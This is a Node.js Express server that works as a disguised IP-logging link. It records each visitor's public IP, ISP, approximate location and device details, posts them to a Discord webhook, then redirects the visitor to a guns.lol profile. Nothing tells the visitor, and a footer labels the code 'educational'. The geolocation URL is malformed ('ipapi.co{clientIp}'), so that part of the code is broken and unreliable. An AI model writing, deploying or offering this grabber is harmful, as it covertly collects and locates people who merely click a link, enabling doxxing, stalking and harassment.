const express = require('express');
const useragent = require('express-useragent');

const app = express();
const PORT = process.env.PORT || 3000;

// Trust Render's reverse proxy headers to accurately capture client IPs
app.enable('trust proxy');

// Use the useragent middleware to easily read device details
app.use(useragent.express());

// Securely access the Discord Webhook from Render environment variables
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.get('/', async (req, res) => {
    // 1. Capture the initial incoming proxy header string
    let rawIp = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    let clientIp = '';

    // 2. Safely isolate the very first IP in the proxy chain and remove any spaces
    if (rawIp) {
        if (rawIp.includes(',')) {
            clientIp = rawIp.split(',')[0].trim();
        } else {
            clientIp = rawIp.trim();
        }
    }

    // Strip legacy IPv6 loopback routing prefixes if present
    if (clientIp && clientIp.startsWith('::ffff:')) {
        clientIp = clientIp.replace('::ffff:', '');
    }

    // 3. Format device information using the middleware parsing results
    let deviceType = "Desktop/Laptop";
    if (req.useragent.isMobile) deviceType = "Mobile Phone";
    if (req.useragent.isTablet) deviceType = "Tablet";
    if (req.useragent.isBot) deviceType = "Search Bot / Automated Script";
    
    const osName = req.useragent.os || "Unknown OS";
    const browserName = req.useragent.browser || "Unknown Browser";
    const rawUserAgent = req.headers['user-agent'] || "Unknown User Agent";

    // 4. Define defaults for network and geographic data
    let locationData = {
        country: "Unknown / Cloud Proxy",
        city: "Unknown",
        isp: "Unknown Network Provider"
    };

    // 5. Perform an HTTPS background lookup if it is a valid public IP address
    if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1') {
        try {
            // Using ipapi.co via HTTPS for secure, reliable container networking
            const response = await fetch(`https://ipapi.co{clientIp}/json/`);
            if (response.ok) {
                const data = await response.json();
                if (!data.error) {
                    locationData.country = data.country_name || "Unknown Country";
                    locationData.city = data.city || "Unknown City";
                    locationData.isp = data.org || "Unknown Network Provider";
                }
            }
        } catch (error) {
            console.error("[Backend Error] Geolocation resolution failed:", error.message);
        }
    }

    // 6. Structure a Discord Rich Embed payload with the requested metrics
    const discordPayload = {
        username: "Traffic Logger System",
        avatar_url: "https://imgur.com", 
        embeds: [{
            title: "📥 Incoming Connection Analyzed",
            description: `A client initiated a request and was automatically routed to your guns.lol profile.`,
            color: 5814783, 
            fields: [
                { name: "🌐 Public IP Address", value: `\`${clientIp}\``, inline: true },
                { name: "📡 Network Operator (ISP)", value: `\`${locationData.isp}\``, inline: true },
                { name: "📍 Approximate Location", value: `\`${locationData.city}, ${locationData.country}\``, inline: false },
                { name: "📱 Device Classification", value: `\`${deviceType} (${osName} / ${browserName})\``, inline: false },
                { name: "📝 Raw User-Agent Header", value: `\`\`\`${rawUserAgent}\`\`\``, inline: false }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Educational Network Analytics Routing"
            }
        }]
    };

    // 7. Forward the payload to the Discord Webhook asynchronously
    try {
        if (DISCORD_WEBHOOK_URL) {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });
        }
    } catch (webhookError) {
        console.error("[Backend Error] Could not post payload to Discord:", webhookError.message);
    }

    // 8. Redirect the user to your landing page
    return res.redirect(302, 'https://guns.lol/xsaint');
});

app.listen(PORT, () => {
    console.log(`Server actively initialized on port ${PORT}`);
});
